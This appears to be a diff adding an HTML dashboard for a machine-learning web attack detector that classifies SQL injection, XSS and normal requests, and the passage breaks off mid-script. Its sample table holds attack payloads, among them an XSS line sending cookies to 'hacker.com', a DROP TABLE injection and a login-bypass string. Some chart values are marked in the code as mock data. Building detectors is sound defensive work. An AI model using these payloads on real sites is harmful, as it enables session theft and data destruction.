@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Attack Detection Dashboard</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- Three.js and OrbitControls -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            dark: '#0f172a',    /* Slate 900 */
+                            card: '#1e293b',    /* Slate 800 */
+                            primary: '#3b82f6', /* Blue 500 */
+                            accent: '#10b981',  /* Emerald 500 */
+                            danger: '#ef4444',  /* Red 500 */
+                            warning: '#f59e0b'  /* Amber 500 */
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    animation: {
+                        'slide-up': 'slideUp 0.6s ease-out forwards',
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                    },
+                    keyframes: {
+                        slideUp: {
+                            '0%': { opacity: 0, transform: 'translateY(20px)' },
+                            '100%': { opacity: 1, transform: 'translateY(0)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            background-color: #020617; /* Very dark slate */
+            color: #f8fafc;
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(59, 130, 246, 0.08), transparent 25%),
+                radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.05), transparent 25%);
+            background-attachment: fixed;
+        }
+
+        .glass-card {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+
+        .delay-100 { animation-delay: 100ms; }
+        .delay-200 { animation-delay: 200ms; }
+        .delay-300 { animation-delay: 300ms; }
+        .delay-400 { animation-delay: 400ms; }
+    </style>
+</head>
+<body class="font-sans antialiased min-h-screen">
+
+    <!-- Navbar -->
+    <nav class="glass-card sticky top-0 z-50 border-b border-slate-700/50 px-6 py-4">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="bg-brand-primary/20 p-2 rounded-lg border border-brand-primary/30">
+                    <i class="fa-solid fa-shield-halved text-brand-primary text-xl"></i>
+                </div>
+                <div>
+                    <h1 class="text-xl font-bold tracking-tight">CyberSec<span class="text-brand-primary">Shield</span></h1>
+                    <p class="text-xs text-slate-400">Project ID: 2026CS001 | Web Attack Detection</p>
+                </div>
+            </div>
+            <div class="hidden sm:flex items-center gap-4 text-sm font-medium text-slate-300">
+                <span class="flex items-center gap-2 px-3 py-1 bg-emerald-500/10 text-emerald-400 rounded-full border border-emerald-500/20">
+                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span> Pipeline Active
+                </span>
+            </div>
+        </div>
+    </nav>
+
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
+
+        <!-- Beginner's Guide Section -->
+        <div class="glass-card rounded-2xl p-6 shadow-lg border border-slate-700/50 animate-slide-up">
+            <h2 class="text-2xl font-bold mb-4 flex items-center">
+                <i class="fa-solid fa-book-open text-brand-primary mr-3"></i> Beginner's Guide: What are we detecting?
+            </h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                
+                <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700/50 relative overflow-hidden group">
+                    <div class="absolute top-0 right-0 w-16 h-16 bg-emerald-500/10 rounded-bl-full -z-10 group-hover:bg-emerald-500/20 transition-colors"></div>
+                    <h3 class="text-lg font-semibold text-emerald-400 mb-2"><i class="fa-solid fa-user-check mr-2"></i>Normal Traffic</h3>
+                    <p class="text-sm text-slate-300">Everyday web requests. Users logging in normally, searching for products, or filling out standard contact forms. These payloads usually contain standard text, names, and regular characters.</p>
+                </div>
+
+                <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700/50 relative overflow-hidden group">
+                    <div class="absolute top-0 right-0 w-16 h-16 bg-amber-500/10 rounded-bl-full -z-10 group-hover:bg-amber-500/20 transition-colors"></div>
+                    <h3 class="text-lg font-semibold text-amber-400 mb-2"><i class="fa-solid fa-code text-amber-500 mr-2"></i>XSS (Cross-Site Scripting)</h3>
+                    <p class="text-sm text-slate-300">Attackers try to sneak malicious JavaScript code into a website. If successful, this code runs in *other users'* browsers, potentially stealing their login cookies or hijacking their sessions. Look for tags like <code>&lt;script&gt;</code>.</p>
+                </div>
+
+                <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700/50 relative overflow-hidden group">
+                     <div class="absolute top-0 right-0 w-16 h-16 bg-red-500/10 rounded-bl-full -z-10 group-hover:bg-red-500/20 transition-colors"></div>
+                    <h3 class="text-lg font-semibold text-red-400 mb-2"><i class="fa-solid fa-database text-red-500 mr-2"></i>SQLi (SQL Injection)</h3>
+                    <p class="text-sm text-slate-300">Attackers try to trick the website's database. By entering database commands (like <code>SELECT</code> or <code>OR 1=1</code>) into input fields, they attempt to bypass logins, steal private data, or even delete the entire database.</p>
+                </div>
+            </div>
+            
+            <div class="mt-6 bg-slate-900/50 p-4 rounded-xl border-l-4 border-brand-primary">
+                <h4 class="font-semibold text-white mb-1">Why use Machine Learning?</h4>
+                <p class="text-sm text-slate-400">Traditional security relies on "rule lists" (e.g., Block anything with <code>&lt;script&gt;</code>). Hackers easily bypass these by slightly changing their text (e.g., <code>&lt;sCrIpT&gt;</code>). Our <strong>Machine Learning pipeline</strong> acts like an AI detective, learning the underlying *patterns* and *structure* of attacks rather than just memorizing rules, making it much harder to trick.</p>
+            </div>
+        </div>
+
+        <!-- KPIs -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 animate-slide-up delay-100">
+            <!-- Total -->
+            <div class="glass-card rounded-2xl p-5 shadow-lg border border-slate-700/50 flex items-center justify-between group hover:border-brand-primary/50 transition-colors">
+                <div>
+                    <p class="text-xs font-medium text-slate-400 uppercase tracking-wider mb-1">Total Payloads</p>
+                    <h2 class="text-3xl font-bold text-white">18,400</h2>
+                </div>
+                <div class="w-12 h-12 rounded-full bg-slate-800 flex items-center justify-center border border-slate-700 group-hover:bg-brand-primary/20 group-hover:border-brand-primary/50 transition-all">
+                    <i class="fa-solid fa-server text-slate-300 group-hover:text-brand-primary"></i>
+                </div>
+            </div>
+            <!-- SQLi -->
+            <div class="glass-card rounded-2xl p-5 shadow-lg border border-slate-700/50 flex items-center justify-between group hover:border-red-500/50 transition-colors">
+                <div>
+                    <p class="text-xs font-medium text-slate-400 uppercase tracking-wider mb-1">SQL Injection (SQLi)</p>
+                    <h2 class="text-3xl font-bold text-red-400">8,471</h2>
+                </div>
+                <div class="w-12 h-12 rounded-full bg-slate-800 flex items-center justify-center border border-slate-700 group-hover:bg-red-500/20 group-hover:border-red-500/50 transition-all">
+                    <i class="fa-solid fa-database text-slate-300 group-hover:text-red-400"></i>
+                </div>
+            </div>
+            <!-- XSS -->
+            <div class="glass-card rounded-2xl p-5 shadow-lg border border-slate-700/50 flex items-center justify-between group hover:border-amber-500/50 transition-colors">
+                <div>
+                    <p class="text-xs font-medium text-slate-400 uppercase tracking-wider mb-1">Cross-Site Scripting</p>
+                    <h2 class="text-3xl font-bold text-amber-400">6,690</h2>
+                </div>
+                <div class="w-12 h-12 rounded-full bg-slate-800 flex items-center justify-center border border-slate-700 group-hover:bg-amber-500/20 group-hover:border-amber-500/50 transition-all">
+                    <i class="fa-solid fa-code text-slate-300 group-hover:text-amber-400"></i>
+                </div>
+            </div>
+            <!-- Normal -->
+             <div class="glass-card rounded-2xl p-5 shadow-lg border border-slate-700/50 flex items-center justify-between group hover:border-emerald-500/50 transition-colors">
+                <div>
+                    <p class="text-xs font-medium text-slate-400 uppercase tracking-wider mb-1">Normal Traffic</p>
+                    <h2 class="text-3xl font-bold text-emerald-400">3,239</h2>
+                </div>
+                <div class="w-12 h-12 rounded-full bg-slate-800 flex items-center justify-center border border-slate-700 group-hover:bg-emerald-500/20 group-hover:border-emerald-500/50 transition-all">
+                    <i class="fa-solid fa-user-check text-slate-300 group-hover:text-emerald-400"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- Middle Section: System Architecture & Data Imbalance -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 animate-slide-up delay-200">
+            
+            <!-- System Architecture -->
+            <div class="glass-card rounded-2xl shadow-lg border border-slate-700/50 lg:col-span-2 overflow-hidden flex flex-col">
+                <div class="p-5 border-b border-slate-700/50 bg-slate-800/30">
+                    <h3 class="text-lg font-bold text-white"><i class="fa-solid fa-network-wired text-brand-primary mr-2"></i>System Architecture Overview</h3>
+                </div>
+                <div class="p-6 flex-grow flex items-center justify-center bg-slate-900/50">
+                    <!-- Flow Diagram using Flexbox and Icons -->
+                    <div class="flex flex-col md:flex-row items-center justify-between w-full max-w-3xl gap-4">
+                        
+                        <!-- Client -->
+                        <div class="flex flex-col items-center">
+                            <div class="w-16 h-16 rounded-2xl bg-slate-800 border border-slate-600 flex items-center justify-center shadow-lg relative group">
+                                <i class="fa-solid fa-laptop text-2xl text-slate-300 group-hover:text-brand-primary transition-colors"></i>
+                                <!-- Payload flying animation -->
+                                <div class="absolute -right-10 top-1/2 w-4 h-1 bg-brand-primary opacity-0 group-hover:animate-[flyRight_1s_infinite]"></div>
+                            </div>
+                            <span class="mt-2 text-xs font-medium text-slate-400 text-center">User Request<br>(HTTP Payload)</span>
+                        </div>
+
+                        <!-- Arrow -->
+                        <div class="hidden md:flex items-center text-slate-600">
+                            <div class="w-16 h-0.5 bg-slate-600 border-dashed border-t border-slate-600"></div>
+                            <i class="fa-solid fa-chevron-right ml-[-5px]"></i>
+                        </div>
+
+                        <!-- Firewall / App -->
+                        <div class="flex flex-col items-center">
+                            <div class="w-20 h-20 rounded-2xl bg-brand-primary/10 border-2 border-brand-primary flex items-center justify-center shadow-[0_0_15px_rgba(59,130,246,0.3)] relative">
+                                <i class="fa-solid fa-shield-halved text-3xl text-brand-primary"></i>
+                                <div class="absolute -bottom-1 -right-1 w-6 h-6 bg-slate-800 rounded-full border border-slate-600 flex items-center justify-center">
+                                    <i class="fa-solid fa-cog text-[10px] text-slate-400 animate-spin"></i>
+                                </div>
+                            </div>
+                            <span class="mt-2 text-xs font-medium text-brand-primary text-center">Web Application Firewall<br>(Feature Extraction)</span>
+                        </div>
+
+                        <!-- Arrow -->
+                        <div class="hidden md:flex items-center text-slate-600">
+                            <div class="w-16 h-0.5 bg-slate-600 border-dashed border-t border-slate-600"></div>
+                            <i class="fa-solid fa-chevron-right ml-[-5px]"></i>
+                        </div>
+
+                        <!-- ML Model -->
+                        <div class="flex flex-col items-center">
+                            <div class="w-16 h-16 rounded-2xl bg-slate-800 border border-slate-600 flex items-center justify-center shadow-lg group">
+                                <i class="fa-solid fa-brain text-2xl text-slate-300 group-hover:text-purple-400 transition-colors"></i>
+                            </div>
+                            <span class="mt-2 text-xs font-medium text-slate-400 text-center">ML Classifier<br>(Trained Model)</span>
+                        </div>
+
+                        <!-- Split Arrows -->
+                        <div class="hidden md:flex flex-col justify-center h-24 w-12 relative">
+                             <!-- Top branch -->
+                             <svg class="absolute top-2 left-0 w-full h-10 text-slate-600" preserveAspectRatio="none" viewBox="0 0 100 100">
+                                <path d="M 0,100 C 50,100 50,0 100,0" fill="none" stroke="currentColor" stroke-width="4" stroke-dasharray="8 4"/>
+                                <polygon points="100,0 90,-5 90,5" fill="currentColor"/>
+                            </svg>
+                            <!-- Bottom branch -->
+                            <svg class="absolute bottom-2 left-0 w-full h-10 text-slate-600" preserveAspectRatio="none" viewBox="0 0 100 100">
+                                <path d="M 0,0 C 50,0 50,100 100,100" fill="none" stroke="currentColor" stroke-width="4" stroke-dasharray="8 4"/>
+                                <polygon points="100,100 90,95 90,105" fill="currentColor"/>
+                            </svg>
+                        </div>
+
+                        <!-- Outcomes -->
+                        <div class="flex flex-col gap-4 mt-6 md:mt-0">
+                            <div class="flex items-center gap-2 bg-red-500/10 border border-red-500/30 px-3 py-1.5 rounded-lg">
+                                <i class="fa-solid fa-ban text-red-500 text-sm"></i>
+                                <span class="text-xs text-red-400 font-medium">Block (Attack)</span>
+                            </div>
+                            <div class="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/30 px-3 py-1.5 rounded-lg">
+                                <i class="fa-solid fa-check text-emerald-500 text-sm"></i>
+                                <span class="text-xs text-emerald-400 font-medium">Allow (Normal)</span>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+            <!-- Distribution Chart -->
+            <div class="glass-card rounded-2xl shadow-lg border border-slate-700/50 flex flex-col">
+                <div class="p-5 border-b border-slate-700/50 bg-slate-800/30">
+                    <h3 class="text-lg font-bold text-white"><i class="fa-solid fa-chart-pie text-brand-primary mr-2"></i>Dataset Imbalance</h3>
+                </div>
+                <div class="p-5 flex-grow relative flex items-center justify-center">
+                    <div class="h-48 w-full max-w-[250px]">
+                        <canvas id="distributionChart"></canvas>
+                    </div>
+                </div>
+                <div class="p-4 bg-slate-900/50 border-t border-slate-700/50">
+                    <p class="text-xs text-slate-400 leading-relaxed">
+                        <span class="text-warning font-semibold"><i class="fa-solid fa-triangle-exclamation mr-1"></i> Note for Pipeline Step 7:</span> 
+                        The dataset is skewed towards attack samples. Standard accuracy might be misleading. Metrics like <span class="text-slate-200">Precision, Recall, and F1-Score</span> are crucial for evaluating the model.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- 3D Feature Space Explorer -->
+        <div class="glass-card rounded-2xl shadow-lg border border-slate-700/50 overflow-hidden animate-slide-up delay-300 relative flex flex-col">
+            <div class="p-6 border-b border-slate-700/50 bg-slate-800/30 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 z-10 relative">
+                <div>
+                    <h3 class="text-lg font-bold text-white mb-1">
+                        <i class="fa-brands fa-space-awesome text-brand-primary mr-2"></i>Interactive 3D Feature Space
+                    </h3>
+                    <p class="text-xs text-slate-400">Step 3 (EDA): Visualizing how extracted features naturally group different payload types.</p>
+                </div>
+                
+                <!-- Controls Panel -->
+                <div class="flex flex-wrap items-center gap-4 bg-slate-900/80 p-3 rounded-xl border border-slate-600 shadow-inner text-sm">
+                    <div class="flex items-center gap-3 border-r border-slate-700 pr-4">
+                        <label class="flex items-center gap-2 cursor-pointer text-emerald-400 hover:text-emerald-300">
+                            <input type="checkbox" id="toggle-normal" checked class="accent-emerald-500 rounded bg-slate-700 border-slate-600"> Normal
+                        </label>
+                        <label class="flex items-center gap-2 cursor-pointer text-amber-400 hover:text-amber-300">
+                            <input type="checkbox" id="toggle-xss" checked class="accent-amber-500 rounded bg-slate-700 border-slate-600"> XSS
+                        </label>
+                        <label class="flex items-center gap-2 cursor-pointer text-red-400 hover:text-red-300">
+                            <input type="checkbox" id="toggle-sqli" checked class="accent-red-500 rounded bg-slate-700 border-slate-600"> SQLi
+                        </label>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-arrows-rotate text-slate-500 text-xs"></i>
+                        <input type="range" id="speed-slider" min="0" max="5" step="0.1" value="1.5" class="w-20 accent-brand-primary h-1 bg-slate-700 rounded-lg appearance-none cursor-pointer">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="flex flex-col lg:flex-row">
+                <!-- 3D Canvas Container -->
+                <!-- CRITICAL: position:relative is needed for absolute positioning of tooltip inside it -->
+                <div class="relative w-full lg:w-2/3 h-[450px] bg-[#050810] cursor-move border-b lg:border-b-0 lg:border-r border-slate-700/50" id="threejs-container">
+                    
+                    <!-- NEW: 3D Tooltip Element - Hidden by default -->
+                    <div id="3d-tooltip" class="absolute hidden bg-slate-900/95 backdrop-blur-md border border-slate-600 text-white text-xs px-3 py-2 rounded-lg shadow-xl pointer-events-none z-50 transition-opacity duration-150 opacity-0 transform -translate-x-1/2 -translate-y-full mt-[-10px]">
+                        <span id="tooltip-content" class="font-bold flex items-center gap-2"></span>
+                    </div>
+
+                    <!-- Overlay instructions -->
+                    <div class="absolute bottom-4 right-4 bg-slate-900/80 backdrop-blur text-slate-300 text-[10px] px-3 py-2 rounded-lg border border-slate-700 pointer-events-none flex flex-col gap-1">
+                        <span class="flex items-center gap-1"><i class="fa-solid fa-hand-pointer w-3"></i> Left Click + Drag to Rotate</span>
+                        <span class="flex items-center gap-1"><i class="fa-solid fa-magnifying-glass w-3"></i> Scroll to Zoom</span>
+                        <span class="flex items-center gap-1"><i class="fa-solid fa-mouse-pointer w-3"></i> Hover to identify clusters</span>
+                    </div>
+                </div>
+                
+                <!-- Explanation Panel -->
+                <div class="w-full lg:w-1/3 p-6 bg-slate-800/20 flex flex-col justify-center">
+                    <h4 class="font-bold text-white mb-3 border-b border-slate-700/50 pb-2">What am I looking at?</h4>
+                    <p class="text-sm text-slate-300 mb-4 leading-relaxed">
+                        This 3D galaxy represents the <strong>18,400 payloads</strong> mapped into space using Principal Component Analysis (PCA). 
+                        Instead of raw text, the axes represent extracted features:
+                    </p>
+                    <ul class="text-sm text-slate-400 space-y-3 mb-6">
+                        <li class="flex items-start gap-2">
+                            <i class="fa-solid fa-ruler-horizontal text-brand-primary mt-1"></i>
+                            <span><strong>X-Axis:</strong> Payload Length</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <i class="fa-solid fa-hashtag text-brand-primary mt-1"></i>
+                            <span><strong>Y-Axis:</strong> Frequency of special characters <code>&lt; &gt; " \ ( )</code></span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <i class="fa-solid fa-1 text-brand-primary mt-1"></i>
+                            <span><strong>Z-Axis:</strong> Density of numerical digits</span>
+                        </li>
+                    </ul>
+                    <div class="bg-brand-primary/10 border border-brand-primary/30 p-4 rounded-xl">
+                        <p class="text-sm text-brand-primary">
+                            <strong>The ML Goal:</strong> Notice how the colors clump together? Our Machine Learning model (Step 6) learns to draw mathematical boundaries between these distinct clusters to classify new, unseen traffic.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Deep Dive: Dataset Feature Analysis -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 animate-slide-up delay-400">
+            <!-- Feature Comparison Chart -->
+            <div class="glass-card rounded-2xl shadow-lg border border-slate-700/50 flex flex-col">
+                 <div class="p-5 border-b border-slate-700/50 bg-slate-800/30">
+                    <h3 class="text-lg font-bold text-white"><i class="fa-solid fa-chart-column text-brand-primary mr-2"></i>Feature Averages by Class</h3>
+                    <p class="text-xs text-slate-400 mt-1">Why specific features were chosen for extraction.</p>
+                </div>
+                <div class="p-5 flex-grow relative">
+                    <div class="h-64 w-full">
+                        <canvas id="featureBarChart"></canvas>
+                    </div>
+                </div>
+            </div>
+
+             <!-- Top Malicious Signatures Chart -->
+             <div class="glass-card rounded-2xl shadow-lg border border-slate-700/50 flex flex-col">
+                <div class="p-5 border-b border-slate-700/50 bg-slate-800/30">
+                   <h3 class="text-lg font-bold text-white"><i class="fa-solid fa-bug text-brand-primary mr-2"></i>Top Malicious Signatures</h3>
+                   <p class="text-xs text-slate-400 mt-1">Common keywords found during text vectorization (TF-IDF).</p>
+               </div>
+               <div class="p-5 flex-grow relative">
+                   <div class="h-64 w-full">
+                       <canvas id="signaturesChart"></canvas>
+                   </div>
+               </div>
+           </div>
+        </div>
+
+        <!-- Dataset Samples Table -->
+        <div class="glass-card rounded-2xl shadow-lg border border-slate-700/50 overflow-hidden mb-10 animate-slide-up delay-400">
+            <div class="p-6 border-b border-slate-700/50 bg-slate-800/30 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
+                <div>
+                    <h3 class="text-lg font-bold text-white mb-1"><i class="fa-solid fa-vial-virus text-brand-primary mr-2"></i>Live Dataset Samples</h3>
+                    <p class="text-xs text-slate-400">Excerpts from <code>shengqin/web-attacks-long</code> showing feature extraction.</p>
+                </div>
+                <div class="flex items-center gap-3 w-full sm:w-auto">
+                    <!-- NEW: Live Search Input -->
+                    <div class="relative w-full sm:w-64">
+                        <i class="fa-solid fa-search absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 text-xs"></i>
+                        <input type="text" id="tableSearch" placeholder="Search payloads or labels..." class="w-full bg-slate-900/80 border border-slate-600 text-slate-200 text-xs rounded-lg focus:ring-brand-primary focus:border-brand-primary block pl-8 p-2 transition-colors placeholder-slate-500 outline-none">
+                    </div>
+                    <button class="text-xs bg-slate-700 hover:bg-slate-600 text-white px-3 py-2 rounded-lg transition-colors border border-slate-600 whitespace-nowrap flex items-center">
+                        <i class="fa-solid fa-download mr-1"></i> Export
+                    </button>
+                </div>
+            </div>
+            <div class="overflow-x-auto">
+                <table class="w-full text-sm text-left text-slate-300" id="datasetTable">
+                    <thead class="text-xs text-slate-400 uppercase bg-slate-900/50 border-b border-slate-700/50">
+                        <tr>
+                            <th scope="col" class="px-6 py-4 font-medium">ID</th>
+                            <th scope="col" class="px-6 py-4 font-medium w-1/2">Raw Payload</th>
+                            <th scope="col" class="px-6 py-4 font-medium">Extracted Features<br><span class="text-[10px] lowercase text-slate-500">(Length, Sp. Chars)</span></th>
+                            <th scope="col" class="px-6 py-4 font-medium text-right">Class Label</th>
+                        </tr>
+                    </thead>
+                    <tbody class="divide-y divide-slate-700/50" id="tableBody">
+                        <tr class="hover:bg-slate-800/30 transition-colors">
+                            <td class="px-6 py-4 whitespace-nowrap font-mono text-xs text-slate-500">#8472</td>
+                            <td class="px-6 py-4 font-mono text-xs text-emerald-300/80 break-all">GET /shop/item?id=123&sort=price_asc HTTP/1.1<br>Host: example.com<br>User-Agent: Mozilla/5.0</td>
+                            <td class="px-6 py-4">
+                                <div class="flex gap-2">
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">L: 82</span>
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">SC: 0</span>
+                                </div>
+                            </td>
+                            <td class="px-6 py-4 text-right">
+                                <span class="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-xs font-medium px-2.5 py-1 rounded-full"><i class="fa-solid fa-user-check mr-1"></i> Normal</span>
+                            </td>
+                        </tr>
+                        <tr class="hover:bg-slate-800/30 transition-colors">
+                            <td class="px-6 py-4 whitespace-nowrap font-mono text-xs text-slate-500">#1205</td>
+                            <td class="px-6 py-4 font-mono text-xs text-amber-300/80 break-all">POST /comment HTTP/1.1<br>body=Great post! &lt;script&gt;fetch('http://hacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</td>
+                            <td class="px-6 py-4">
+                                <div class="flex gap-2">
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">L: 112</span>
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">SC: 4</span>
+                                </div>
+                            </td>
+                            <td class="px-6 py-4 text-right">
+                                <span class="bg-amber-500/10 text-amber-400 border border-amber-500/20 text-xs font-medium px-2.5 py-1 rounded-full"><i class="fa-solid fa-code mr-1"></i> XSS</span>
+                            </td>
+                        </tr>
+                        <tr class="hover:bg-slate-800/30 transition-colors">
+                            <td class="px-6 py-4 whitespace-nowrap font-mono text-xs text-slate-500">#4091</td>
+                            <td class="px-6 py-4 font-mono text-xs text-red-300/80 break-all">GET /login?user=admin' OR '1'='1&pass=random HTTP/1.1</td>
+                            <td class="px-6 py-4">
+                                <div class="flex gap-2">
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">L: 52</span>
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">SC: 2</span>
+                                </div>
+                            </td>
+                            <td class="px-6 py-4 text-right">
+                                <span class="bg-red-500/10 text-red-400 border border-red-500/20 text-xs font-medium px-2.5 py-1 rounded-full"><i class="fa-solid fa-database mr-1"></i> SQLi</span>
+                            </td>
+                        </tr>
+                        <tr class="hover:bg-slate-800/30 transition-colors">
+                            <td class="px-6 py-4 whitespace-nowrap font-mono text-xs text-slate-500">#6622</td>
+                            <td class="px-6 py-4 font-mono text-xs text-red-300/80 break-all">GET /search?q=shoes'; DROP TABLE users;-- HTTP/1.1</td>
+                            <td class="px-6 py-4">
+                                <div class="flex gap-2">
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">L: 51</span>
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">SC: 0</span>
+                                </div>
+                            </td>
+                            <td class="px-6 py-4 text-right">
+                                <span class="bg-red-500/10 text-red-400 border border-red-500/20 text-xs font-medium px-2.5 py-1 rounded-full"><i class="fa-solid fa-database mr-1"></i> SQLi</span>
+                            </td>
+                        </tr>
+                        <tr class="hover:bg-slate-800/30 transition-colors">
+                            <td class="px-6 py-4 whitespace-nowrap font-mono text-xs text-slate-500">#9910</td>
+                            <td class="px-6 py-4 font-mono text-xs text-amber-300/80 break-all">GET /profile?name=&lt;img src=x onerror=alert(1)&gt; HTTP/1.1</td>
+                            <td class="px-6 py-4">
+                                <div class="flex gap-2">
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">L: 54</span>
+                                    <span class="bg-slate-800 border border-slate-600 px-2 py-0.5 rounded text-xs">SC: 4</span>
+                                </div>
+                            </td>
+                            <td class="px-6 py-4 text-right">
+                                <span class="bg-amber-500/10 text-amber-400 border border-amber-500/20 text-xs font-medium px-2.5 py-1 rounded-full"><i class="fa-solid fa-code mr-1"></i> XSS</span>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            <!-- Empty state for search -->
+            <div id="noResults" class="hidden p-8 text-center text-slate-500 text-sm">
+                <i class="fa-solid fa-magnifying-glass mb-2 text-2xl opacity-50"></i>
+                <p>No payloads match your search.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        Chart.defaults.color = '#94a3b8';
+        Chart.defaults.font.family = "'Inter', sans-serif";
+        Chart.defaults.plugins.tooltip.backgroundColor = 'rgba(15, 23, 42, 0.9)';
+        Chart.defaults.plugins.tooltip.titleColor = '#fff';
+        Chart.defaults.plugins.tooltip.bodyColor = '#cbd5e1';
+        Chart.defaults.plugins.tooltip.borderColor = 'rgba(255,255,255,0.1)';
+        Chart.defaults.plugins.tooltip.borderWidth = 1;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            const searchInput = document.getElementById('tableSearch');
+            const tableRows = document.querySelectorAll('#tableBody tr');
+            const noResults = document.getElementById('noResults');
+            
+            searchInput.addEventListener('input', function(e) {
+                const searchTerm = e.target.value.toLowerCase();
+                let visibleCount = 0;
+                
+                tableRows.forEach(row => {
+                    const rowText = row.textContent.toLowerCase();
+                    if (rowText.includes(searchTerm)) {
+                        row.style.display = '';
+                        visibleCount++;
+                    } else {
+                        row.style.display = 'none';
+                    }
+                });
+
+                if(visibleCount === 0) {
+                    noResults.classList.remove('hidden');
+                } else {
+                    noResults.classList.add('hidden');
+                }
+            });
+
+            const ctx1 = document.getElementById('distributionChart').getContext('2d');
+            new Chart(ctx1, {
+                type: 'doughnut',
+                data: {
+                    labels: ['SQLi', 'XSS', 'Normal'],
+                    datasets: [{
+                        data: [8471, 6690, 3239],
+                        backgroundColor: [
+                            'rgba(239, 68, 68, 0.8)',   /* Red */
+                            'rgba(245, 158, 11, 0.8)',  /* Amber */
+                            'rgba(16, 185, 129, 0.8)'   /* Emerald */
+                        ],
+                        borderColor: '#1e293b',
+                        borderWidth: 2,
+                        hoverOffset: 4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    cutout: '75%',
+                    plugins: {
+                        legend: { position: 'bottom', labels: { boxWidth: 12, padding: 15 } }
+                    }
+                }
+            });
+
+            const ctx2 = document.getElementById('featureBarChart').getContext('2d');
+            new Chart(ctx2, {
+                type: 'bar',
+                data: {
+                    labels: ['Normal', 'XSS', 'SQLi'],
+                    datasets: [
+                        {
+                            label: 'Avg Length (chars)',
+                            data: [45, 120, 85], // Mock data representing typical payload lengths
+                            backgroundColor: 'rgba(59, 130, 246, 0.7)', // Blue
+                            borderRadius: 4
+                        },
+                        {
+                            label: 'Avg Special Chars (<, >, etc.)',
+                            data: [0.5, 8.2, 3.1], // Mock data
+                            backgroundColor: 'rgba(168, 85, 247, 0.7)', // Purple
+                            borderRadius: 4
+                        }
+                    ]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        y: { grid: { color: 'rgba(255,255,255,0.05)' }, beginAtZero: true },
+                        x: { grid: { display: false } }
+                    },
+                    plugins: {
+                         legend: { position: 'top', labels: { boxWidth: 12 } }
+                    }
+                }
+            });
+
+             const ctx3 = document.getElementById('signaturesChart').getContext('2d');
+             new Chart(ctx3, {
+                 type: 'bar',
+                 data: {
+                     labels: ['<script>', 'SELECT', 'alert()', 'OR 1=1', 'onload='],
+                     datasets: [{
+                         label: 'Frequency in Attack Payloads',
